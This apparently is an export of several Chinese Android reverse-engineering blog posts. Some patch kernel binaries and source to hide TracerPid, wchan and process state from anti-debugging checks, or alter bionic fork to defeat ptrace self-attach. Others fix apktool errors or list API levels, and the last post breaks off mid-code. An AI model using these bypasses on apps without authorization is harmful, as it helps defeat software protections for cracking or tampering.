        <tag>Android</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向修改安卓内核 x64 过TracerPID反调试</title>
    <url>/2019/09/13/android-kernel-reverse-anti-antidebug/</url>
    <content><![CDATA[<h2 id="建议在git-bash下操作"><a href="#建议在git-bash下操作" class="headerlink" title="建议在git bash下操作"></a>建议在git bash下操作</h2><p>由于解压<code>kernel.gz</code>时使用的不是命令行，导致没有看到输出信息<code>gzip trailing garbage ignored</code>，进而没有对这些数据进行处理，浪费了很多时间。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>直接修改内核，降维打击绕过反调试。<br>如果有内核源码以及环境，当然可以通过直接修改源码的方式生成<code>boot.img</code>。<br>在无内核源码（或者还没配置安卓源码编译环境）的情况下则只能通过逆向来修改内核。</p>
<span id="more"></span>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>Redmi Note 3</code>, <code>arm64</code>, <code>cm12.1</code></p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="1-找到并导出boot-img"><a href="#1-找到并导出boot-img" class="headerlink" title="1. 找到并导出boot.img"></a>1. 找到并导出boot.img</h3><p>进入<code>adb shell</code>并执行su命令获取root权限（platform下文件夹可能会有所不同，即可能不是mtk-msdc.0）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /dev/block/platform/mtk-msdc.0/by-name</span><br></pre></td></tr></table></figure>
<p>根据输出信息<code>boot -&gt; /dev/block/mmcblk0p7</code>得知boot对应该<code>mmcblk0p7</code><br>dd大法导出该文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/dev/block/mmcblk0p7 of=/data/local/boot.img</span><br><span class="line">adb pull /data/local/boot.img boot.img</span><br></pre></td></tr></table></figure>
<h3 id="2-解包boot-img以及内核"><a href="#2-解包boot-img以及内核" class="headerlink" title="2. 解包boot.img以及内核"></a>2. 解包boot.img以及内核</h3><p>此处使用的是<code>bootimg</code>工具（<a href="https://github.com/XhyEax/android_bootimg">下载地址</a>），创建一个临时文件夹，执行<code>./bootimg.exe --unpack-bootimg .\boot.img</code>，再解压<code>kernel.gz</code>得到内核文件<br>强烈建议在<code>git bash</code>下使用<code>gzip -d</code>解压，这样才能查看具体的输出信息<br>输出<code>gzip trailing garbage ignored</code>（尾部垃圾被忽略处理）<br>gzip认为这是尾部垃圾，实际上却是必要的数据，不考虑的话可能会导致无限重启。</p>
<h4 id="收集尾部数据"><a href="#收集尾部数据" class="headerlink" title="收集尾部数据"></a>收集尾部数据</h4><p>解压<code>kernel.gz</code>后重新压缩内核文件，得到没有尾部数据的真实<code>kernel.gz</code>。<br>再通过<code>010Editor</code>在原<code>kernel.gz</code>中，查找真实<code>kernel.gz</code>文件尾（一般四个字节就只有一个结果了），定位到尾部这段数据，保存下来</p>
<h3 id="3-使用IDA64反编译"><a href="#3-使用IDA64反编译" class="headerlink" title="3. 使用IDA64反编译"></a>3. 使用IDA64反编译</h3><p><code>processor type</code>选择<code>ARM Little-endian</code><br>弹出来一个提示框，点击确定，然后输入<code>ROM start address</code>和<code>Loading address</code>为内核基址:<code>0xffffffc000080000</code></p>
<h3 id="4-修改内核文件"><a href="#4-修改内核文件" class="headerlink" title="4.修改内核文件"></a>4.修改内核文件</h3><h4 id="方法1-修改TracerPid的格式字符串"><a href="#方法1-修改TracerPid的格式字符串" class="headerlink" title="方法1 修改TracerPid的格式字符串"></a>方法1 修改TracerPid的格式字符串</h4><p>（该思路来自<a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/">逆向修改内核，绕过TracerPID反调试</a>）<br>使用<code>010Editor</code>打开内核文件，搜索<code>TracerPid</code>，修改<code>TracerPid</code>后的第一个 <code>&quot;%d&quot;</code><br>改成  <code>&quot;0\t&quot;</code> (<code>30 09</code>) 或 <code>&quot;0\n&quot;</code> (<code>30 10</code>) 或 <code>&quot;00&quot;</code> (十六进制<code>30 30</code>)</p>
<h4 id="方法2-修改proc-pid-status函数指令"><a href="#方法2-修改proc-pid-status函数指令" class="headerlink" title="方法2 修改proc_pid_status函数指令"></a>方法2 修改proc_pid_status函数指令</h4><h5 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">cat /proc/kallsyms |grep proc_pid_status</span><br><span class="line">cat /proc/kallsyms |grep __task_pid_nr_ns</span><br></pre></td></tr></table></figure>
<p>输出为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffffffc0001f7aa8 T proc_pid_status</span><br><span class="line">ffffffc0000bb1f0 T __task_pid_nr_ns</span><br></pre></td></tr></table></figure>
<h5 id="定位函数及patch"><a href="#定位函数及patch" class="headerlink" title="定位函数及patch"></a>定位函数及patch</h5><p>在ida中按g跳转到<code>ffffffc0000bb1f0</code>(<code>task_pid_nr_ns</code>)，按p解析函数<br>再按g跳转到<code>ffffffc0001f7aa8</code>(<code>proc_pid_status</code>)，按p解析函数<br>然后回到<code>ffffffc0000bb1f0</code>(<code>task_pid_nr_ns</code>)，按x查看交叉引用，发现已经有<code>ffffffc0001f7aa8</code>(<code>proc_pid_status</code>)调用的信息了<br>双击进入，在IDA View视图中定位到关键指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV W1, W25</span><br><span class="line">MOV X2, X19</span><br><span class="line">BL sub_FFFFFFC0000BB1F0</span><br><span class="line">MOV W25, W0</span><br></pre></td></tr></table></figure>
<p>修改往前第两条和后一条的mov指令（可使用KeyPatch插件），结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV W1, #0</span><br><span class="line">MOV X2, X19</span><br><span class="line">BL sub_FFFFFFC0000BB1F0</span><br><span class="line">MOV W25, #0</span><br></pre></td></tr></table></figure>
<p>对应机器码为<code>01 00 80 52</code>和<code>19 00 80 52</code></p>
<h3 id="5-gzip压缩内核"><a href="#5-gzip压缩内核" class="headerlink" title="5. gzip压缩内核"></a>5. gzip压缩内核</h3><p>在<code>git bash</code>下使用<code>gzip</code>压缩修改后的内核文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip -n -f -9 kernel</span><br></pre></td></tr></table></figure>
<h3 id="6-重打包boot-img"><a href="#6-重打包boot-img" class="headerlink" title="6. 重打包boot.img"></a>6. 重打包boot.img</h3><h4 id="方法1-使用bootimg打包（推荐）"><a href="#方法1-使用bootimg打包（推荐）" class="headerlink" title="方法1 使用bootimg打包（推荐）"></a>方法1 使用bootimg打包（推荐）</h4><p>使用<code>010Editor</code>编辑刚刚生成的<code>kernel.gz</code>，添加上之前获取的尾部数据<br>然后执行<code>./bootimg.exe --repack-bootimg</code>得到的<code>boot-new.img</code>文件，刷入即可</p>
<h4 id="方法2-手动写入boot-img"><a href="#方法2-手动写入boot-img" class="headerlink" title="方法2 手动写入boot.img"></a>方法2 手动写入boot.img</h4><p>使用<code>010Editor</code>分别打开<code>kernel.gz</code>和<code>boot.img</code>，搜索1F 8B 08 00，定位到内核gzip位置（一般是0x800，不确定的话可以打开原本<code>kernel.gz</code>对比）</p>
<h4 id="压缩后大小-lt-真实kernel-gz时"><a href="#压缩后大小-lt-真实kernel-gz时" class="headerlink" title="压缩后大小&lt;=真实kernel.gz时"></a>压缩后大小&lt;=真实kernel.gz时</h4><p>按下<code>insert</code>键，将010改为<code>overwrite</code>（右下角有提示）<br>然后把<code>kernel.gz</code>的内容复制到<code>boot.img</code>的相应位置，保存即可<br>（根据引用文章所说，小于的话可以直接不考虑后面的字节）</p>
<h4 id="压缩后大小-gt-真实kernel-gz时"><a href="#压缩后大小-gt-真实kernel-gz时" class="headerlink" title="压缩后大小&gt;真实kernel.gz时"></a>压缩后大小&gt;真实kernel.gz时</h4><p>按下<code>insert</code>键，将010改为<code>insert</code>（右下角有提示）<br>选定真实<code>kernel.gz</code>部分（即不包括之前获取的尾部数据）<br>然后把<code>kernel.gz</code>的内容复制到<code>boot.img</code>的相应位置，保存即可</p>
<h3 id="6-使用fastboot刷入"><a href="#6-使用fastboot刷入" class="headerlink" title="6. 使用fastboot刷入"></a>6. 使用fastboot刷入</h3><p>使用<code>adb reboot bootloader</code>重启到fastboot<br>然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot boot.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
<p>如果成功的话就直接正常开机了，失败的话看看是不是修改错了内核文件的内容，从原内核开始修改，再次尝试</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/">逆向修改内核，绕过TracerPID反调试</a><br><a href="https://blog.csdn.net/Druke/article/details/80502571">逆向修改MIUI（X64）内核，反制TracerPID反调试踩坑指南</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>修复反编译资源文件报错问题(resource spec)</title>
    <url>/2019/02/28/android-reverse-fix-arsc/</url>
    <content><![CDATA[<h2 id="关于0x01010540错误"><a href="#关于0x01010540错误" class="headerlink" title="关于0x01010540错误"></a>关于<code>0x01010540</code>错误</h2><p><code>0x01010540</code>是因为SDK版本太高，反编译工具识别不出来，需要替换成<code>0x0101048f</code><br>具体方法见后文</p>
<h2 id="关于0x01010543错误"><a href="#关于0x01010543错误" class="headerlink" title="关于0x01010543错误"></a>关于<code>0x01010543</code>错误</h2><p>如果只有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; b.a.a.e: resource spec: 0x01010543</span><br></pre></td></tr></table></figure>
<p>没有<code>UndefinedResObject</code><br>则更换<code>apktool</code>后再试<br><code>apktool</code>可以在<a href="https://down.52pojie.cn/Tools/Android_Tools/">爱盘</a>下载</p>
<p>实在要修复的话，往下看：（都是修改<code>resources.arsc</code>）</p>
<h2 id="修复UndefinedResObject错误"><a href="#修复UndefinedResObject错误" class="headerlink" title="修复UndefinedResObject错误"></a>修复UndefinedResObject错误</h2><p>报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; brut.androlib.err.UndefinedResObject: resource spec: 0x7f000006</span><br></pre></td></tr></table></figure>

<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p><code>aapt dump</code>查看apk的资源信息，并保存到文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aapt d --values resources test.apk &gt;1.txt</span><br></pre></td></tr></table></figure>
<p>找到<code>DataType</code>数据类型不正确的值（搜索<code>attribute</code>即可）对应的描述符（一般是把7f改成00，<code>0x00000006</code>）<br>文件中没有识别出正确的数据类型，显示的是<code>(attribute) 0x00000006</code><br>使用<code>010Editor</code>，Ctrl+F，字节形式搜索对应描述的16进制数的小端字节（就是<code>00000006</code>写成<code>06000000</code>）<br>然后把它前面的字节<code>0x02</code>修改为<code>0x03</code>，保存后替换进apk即可</p>
<h2 id="修复resource-spec-0x01010543"><a href="#修复resource-spec-0x01010543" class="headerlink" title="修复resource spec: 0x01010543"></a>修复resource spec: 0x01010543</h2><p>报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; b.a.a.e: resource spec: 0x01010543</span><br></pre></td></tr></table></figure>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用<code>010Editor</code>，Ctrl+F，字节形式搜索报错的16进制数的小端字节（就是<code>12345678</code>写成<code>78564312</code>）<br>这里我们搜索<code>43050101</code>，然后把它前面的字节<code>0x02</code>修改为<code>0x03</code>，保存后替换进apk即可</p>
<h2 id="修复resource-spec-0x01010540"><a href="#修复resource-spec-0x01010540" class="headerlink" title="修复resource spec: 0x01010540"></a>修复resource spec: 0x01010540</h2><p><code>0x01010540</code>是因为SDK版本太高，反编译工具识别不出来，需要替换成<code>0x0101048f</code></p>
<h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用<code>010Editor</code>，Ctrl+F，字节形式搜索报错的16进制数的小端字节（就是<code>40050101</code>换成<code>8f040101</code>）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u012400885/article/details/80409689">记录Android Killer反编译时遇到的异常</a><br><a href="http://blog.csdn.net/pwelyn/article/details/50620136">保护Android resources文件不被反编译原理分析</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓版本-API级别对照表</title>
    <url>/2021/09/26/android-sdk-api-list/</url>
    <content><![CDATA[<h2 id="SDK变化"><a href="#SDK变化" class="headerlink" title="SDK变化"></a>SDK变化</h2><p>详见<a href="https://developer.android.google.cn/about/versions">Android Releases | Android Developers</a></p>
<h2 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h2><p><a href="https://cs.android.com/">Android Code Search</a> （AOSP官方）<br><a href="http://aosp.opersys.com/">Opersys AOSP Portal</a><br><a href="http://aospxref.com/">AOSPXref</a> （<code>7.1.2</code>-<code>12.0.0</code>）<br><a href="http://androidxref.com/">AndroidXref</a> （<code>2.3.6</code>-<code>9.0.0</code>）</p>
<span id="more"></span>
<h2 id="SDK列表"><a href="#SDK列表" class="headerlink" title="SDK列表"></a>SDK列表</h2><table>
<thead>
<tr>
<th>安卓版本</th>
<th>代号</th>
<th>API级别</th>
<th>虚拟机</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Android 12.0</td>
<td>S</td>
<td>31</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 11.0</td>
<td>R</td>
<td>30</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 10.0</td>
<td>Q</td>
<td>29</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 9</td>
<td>Pie</td>
<td>28</td>
<td></td>
<td><a href="https://developer.android.google.cn/guide/app-compatibility/restrictions-non-sdk-interfaces">非 SDK 接口限制</a></td>
</tr>
<tr>
<td>Android 8.1</td>
<td>Oreo</td>
<td>27</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 8.0</td>
<td>Oreo</td>
<td>26</td>
<td><a href="https://source.android.google.cn/devices/tech/dalvik/improvements">ART 功能改进</a></td>
<td></td>
</tr>
<tr>
<td>Android 7.1.1</td>
<td>Nougat</td>
<td>25</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 7.0</td>
<td>Nougat</td>
<td>24</td>
<td><a href="https://developer.android.google.cn/about/versions/nougat/android-7.0?hl=zh#jit_aot">JIT/AOT 混合编译</a></td>
<td><a href="https://developer.android.google.cn/about/versions/nougat/android-7.0-changes#ndk">NDK 私有库链接限制</a></td>
</tr>
<tr>
<td>Android 6.0</td>
<td>Marshmallow</td>
<td>23</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 5.1</td>
<td>Lolipop</td>
<td>22</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 5.0</td>
<td>Lolipop</td>
<td>21</td>
<td><a href="https://developer.android.google.cn/about/versions/android-5.0-changes#ART">默认 ART</a></td>
<td></td>
</tr>
<tr>
<td>Android 4.4W</td>
<td>KitKat Wear</td>
<td>20</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 4.4</td>
<td>KitKat</td>
<td>19</td>
<td>引入 ART (AOT)</td>
<td></td>
</tr>
<tr>
<td>Android 4.3</td>
<td>Jelly Bean</td>
<td>18</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 4.2</td>
<td>Jelly Bean</td>
<td>17</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 4.1</td>
<td>Jelly Bean</td>
<td>16</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 4.0.3</td>
<td>IceCreamSandwich</td>
<td>15</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 4.0</td>
<td>IceCreamSandwich</td>
<td>14</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 3.2</td>
<td>Honeycomb</td>
<td>13</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 3.1</td>
<td>Honeycomb</td>
<td>12</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 3.0</td>
<td>Honeycomb</td>
<td>11</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 2.3.3</td>
<td>Gingerbread</td>
<td>10</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 2.3</td>
<td>Gingerbread</td>
<td>9</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 2.2</td>
<td>Froyo</td>
<td>8</td>
<td>开始使用 JIT</td>
<td></td>
</tr>
<tr>
<td>Android 2.1</td>
<td>Eclair</td>
<td>7</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 2.0.1</td>
<td>Eclair</td>
<td>6</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 2.0</td>
<td>Eclair</td>
<td>5</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.6</td>
<td>Dout</td>
<td>4</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.5</td>
<td>Cupcake</td>
<td>3</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.1</td>
<td>Base</td>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.0</td>
<td>Base</td>
<td>1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.5</td>
<td>CUPCAKE</td>
<td>3</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.1</td>
<td>BASE_1_1</td>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Android 1.0</td>
<td>BASE</td>
<td>1</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://source.android.google.cn/devices/tech/dalvik">Android Runtime (ART) 和 Dalvik</a><br><a href="https://weishu.me/2018/06/07/free-reflection-above-android-p/">一种绕过Android P对非SDK接口限制的简单方法</a><br><a href="https://www.52pojie.cn/thread-948942-1-1.html">Android7.0以上命名空间详解(dlopen限制)</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>修改安卓内核源码 过State TracerPid wchan反调试</title>
    <url>/2019/09/13/android-source-mod-anti-antidebug/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>修改安卓内核源码，绕过对<code>/proc/$pid/state</code>的<code>State</code>和<code>TracerPid</code>字段，以及<code>/proc/$pid/wchan</code>的反调试检测</p>
<h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>打开内核源码目录，<code>/fs/proc</code>下的<code>base.c</code>和<code>array.c</code></p>
<h2 id="修改点"><a href="#修改点" class="headerlink" title="修改点"></a>修改点</h2><h3 id="base-c"><a href="#base-c" class="headerlink" title="base.c"></a>base.c</h3><h4 id="proc-pid-wchan函数"><a href="#proc-pid-wchan函数" class="headerlink" title="proc_pid_wchan函数"></a>proc_pid_wchan函数</h4><p>最后一个else分支改成</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;   <span class="comment">//修改部分</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(symname,<span class="string">&quot;trace&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;sys_epoll_wait&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%s&quot;</span>, symname);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为/proc/pid/wchan 和 /proc/pid/task/pid/wchan在调试状态下，里面内容为ptrace_stop, 非调试的状态下为ep_poll</p>
</blockquote>
<h3 id="array-c"><a href="#array-c" class="headerlink" title="array.c"></a>array.c</h3><h4 id="1-task-state-array字符数组"><a href="#1-task-state-array字符数组" class="headerlink" title="1. task_state_array字符数组"></a>1. task_state_array字符数组</h4><p>将4和8对应的字符（<code>&quot;T (stopped)&quot;</code>和<code>&quot;t (tracing stop)&quot;</code>）<br>都改成<code>&quot;S (sleeping)&quot;</code></p>
<h4 id="2-task-state函数"><a href="#2-task-state函数" class="headerlink" title="2. task_state函数"></a>2. task_state函数</h4><p>与前文（<a href="https://blog.xhyeax.com/2019/09/13/android-kernel-reverse-anti-antidebug/">逆向修改安卓内核 x64 过TracerPID反调试</a>）目的一致，置<code>TracerPid</code>为0<br>将参数<code>tpid</code>改为0即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">seq_printf</span>(m,</span><br><span class="line">		<span class="string">&quot;State:\t%s\n&quot;</span></span><br><span class="line">		<span class="string">&quot;Tgid:\t%d\n&quot;</span></span><br><span class="line">		<span class="string">&quot;Pid:\t%d\n&quot;</span></span><br><span class="line">		<span class="string">&quot;PPid:\t%d\n&quot;</span></span><br><span class="line">		<span class="string">&quot;TracerPid:\t%d\n&quot;</span></span><br><span class="line">		<span class="string">&quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span></span><br><span class="line">		<span class="string">&quot;Gid:\t%d\t%d\t%d\t%d\n&quot;</span>,</span><br><span class="line">		<span class="built_in">get_task_state</span>(p),</span><br><span class="line">		<span class="built_in">task_tgid_nr_ns</span>(p, ns),</span><br><span class="line">		<span class="built_in">pid_nr_ns</span>(pid, ns),</span><br><span class="line">		<span class="comment">//修改部分</span></span><br><span class="line">		ppid, <span class="comment">/*tpid*/</span><span class="number">0</span>,</span><br><span class="line">		<span class="built_in">from_kuid_munged</span>(user_ns, cred-&gt;uid),</span><br><span class="line">		<span class="built_in">from_kuid_munged</span>(user_ns, cred-&gt;euid),</span><br><span class="line">		<span class="built_in">from_kuid_munged</span>(user_ns, cred-&gt;suid),</span><br><span class="line">		<span class="built_in">from_kuid_munged</span>(user_ns, cred-&gt;fsuid),</span><br><span class="line">		<span class="built_in">from_kgid_munged</span>(user_ns, cred-&gt;gid),</span><br><span class="line">		<span class="built_in">from_kgid_munged</span>(user_ns, cred-&gt;egid),</span><br><span class="line">		<span class="built_in">from_kgid_munged</span>(user_ns, cred-&gt;sgid),</span><br><span class="line">		<span class="built_in">from_kgid_munged</span>(user_ns, cred-&gt;fsgid));</span><br></pre></td></tr></table></figure>

<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>使用调试器附加后，cd到<code>/proc/$pid/</code>，执行以下命令：<br><code>head -8 status</code><br><code>cat wchan</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52pojie.cn/thread-940605-1-1.html">Android反调试——从源码入手</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio 导入so</title>
    <url>/2019/08/02/android-studio-import-so/</url>
    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>在<code>src/main</code>目录下新建<code>jniLibs</code>文件夹 ，添加cpu架构文件夹，如<code>armeabi-v7a</code>，把so文件复制进去即可。<br>编译时会自动打包。</p>
<p>配置<code>build.gradle</code>的<code>android.defaultConfig</code>中的<code>ndk.abiFilters</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ndk &#123;</span><br><span class="line">            abiFilters  &#x27;armeabi-v7a&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/anhenzhufeng/article/details/78913341">Android studio添加第三方库和so</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>修复Android Studio代码修改不生效问题</title>
    <url>/2021/12/01/android-studio-install-old-apk-on-android-11/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>重新编译<code>Xposed</code>模块并点击<code>Run</code>安装后，修改不生效。卸载重装后才生效。</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>尝试修改<code>build.gradle</code>中的<code>versionCode</code>，发现修改代码生效了，于是有了这篇<a href="https://blog.xhyeax.com/2021/10/07/gradle-auto-version-code/">Gradle配置版本号自动增加</a>。（不符合编译习惯，<del>喜欢刷版本号的除外</del>）</p>
<p>今天发现手动<code>Generate Signed APK</code>，然后使用<code>adb install</code>安装，修改也生效了。（太麻烦）</p>
<p>猜测是因为<code>versionCode</code>没变，ART运行了<code>dex2oat</code>优化后的旧代码。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>修改启动配置，设置使用<code>package manager</code>安装：</p>
<p><code>Run / Debug Configurations</code> - <code>General</code> - <code>Always install with package manager (disable deploy optimization on Android 11 and later)</code></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>修复Mac Android Studio无法调试问题</title>
    <url>/2021/12/06/android-studio-stuck-at-debug/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Mac版<code>Android Studio</code>调试，提示<code>Invalid argument : Argument invalid [port]</code><br>搜索得到解决方案，原因是找不到<code>localhost</code>，在<code>/etc/hosts</code>中配置即可（之前不小心覆盖了）</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><code>sudo vim /etc/hosts</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##</span><br><span class="line"># Host Database</span><br><span class="line">#</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">255.255.255.255 broadcasthost</span><br><span class="line">::1             localhost</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/43f2e362857f">Android Studio因为hosts变更无法debug调试问题</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>修改安卓系统源码(fork) 绕过多进程ptrace反调试</title>
    <url>/2019/11/20/android_mod_fork_to_bypass_antidebug/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>多进程ptrace反调试是一种常见的反调试手段，思路为fork出子进程，在子进程中ptrace自身，使得调试器无法附加。通过修改源码来禁止指定进程fork</p>
<span id="more"></span>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="定位到源码位置"><a href="#定位到源码位置" class="headerlink" title="定位到源码位置"></a>定位到源码位置</h3><p>AOSP 5.1.1及6.0.1 fork函数位于：<code>bionic/libc/bionic/fork.cpp</code></p>
<h3 id="添加过滤函数"><a href="#添加过滤函数" class="headerlink" title="添加过滤函数"></a>添加过滤函数</h3><p>通过读取status文件来确定进程名，然后跟文件内容比较，相同则禁止其fork<br>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fcmdline = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">char</span> szCmdline[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> szProcName[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> szTargetPNames[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> procid = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="built_in">sprintf</span>(szCmdline, <span class="string">&quot;/proc/%d/cmdline&quot;</span>, procid);</span><br><span class="line">  fcmdline = <span class="built_in">open</span>(szCmdline, O_RDONLY, <span class="number">0644</span>);</span><br><span class="line">  <span class="keyword">if</span> (fcmdline &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(fcmdline, szProcName, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">close</span>(fcmdline);</span><br><span class="line">  &#125;</span><br><span class="line">  fcmdline = <span class="built_in">open</span>(<span class="string">&quot;/data/filter&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fcmdline &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(fcmdline, szTargetPNames, <span class="number">512</span>);</span><br><span class="line">    <span class="built_in">close</span>(fcmdline);</span><br><span 